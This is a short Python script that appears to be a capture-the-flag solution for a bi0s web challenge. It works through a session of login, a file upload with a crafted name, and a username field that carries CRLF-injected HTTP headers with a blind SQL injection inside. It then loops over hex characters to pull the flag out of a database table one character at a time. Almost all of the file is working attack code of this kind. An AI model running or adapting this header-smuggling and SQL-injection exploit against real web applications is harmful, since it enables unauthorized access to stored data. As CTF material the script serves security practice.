import requests
import re
import string 

#url = "http://localhost:8000"
url = "http://web.chall.bi0s.in:8000"

S = requests.Session()
S.get(url)
S.post(url+'/login.php',data = {"username": "asdf","submit":"submit"} )
S.get(url+'/index.php?new=http:')
S.post(url+"/index.php",files={"file":('asdf.txt@waf','abc.txt')}, data={"submit":"submit","path":"http:"})

files= S.get(url+"/view.php?fol=http:").text
file = re.findall("<a href='(.*?)'>",files)
file = f"http://{file[0].replace('/view.php?file=http:/','')}"
print(file)

payload = """hello
Host: localhost
X-pro_hacker: Pro-hacker
Token: {}
flag: hello
flag: gimme
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

user=a',substr((select*from flag),{},1));--"""
flag = ""

for i in range(1,10):
    for letter in "1234567890abcdef":
        print("Trying....", letter)
        p = payload.format(letter,str(i))
        data = {"username": p.replace("\n","\r\n"),"submit":"submit"}

        S.post(url+'/login.php',data = data )

        res = S.get(url+f"/view.php?fol=.&file={file}").text

        match = re.findall("not found</div>(.)",res)[0]
        #print(res)
        if letter == match:
            flag += letter
            print(flag)
            break
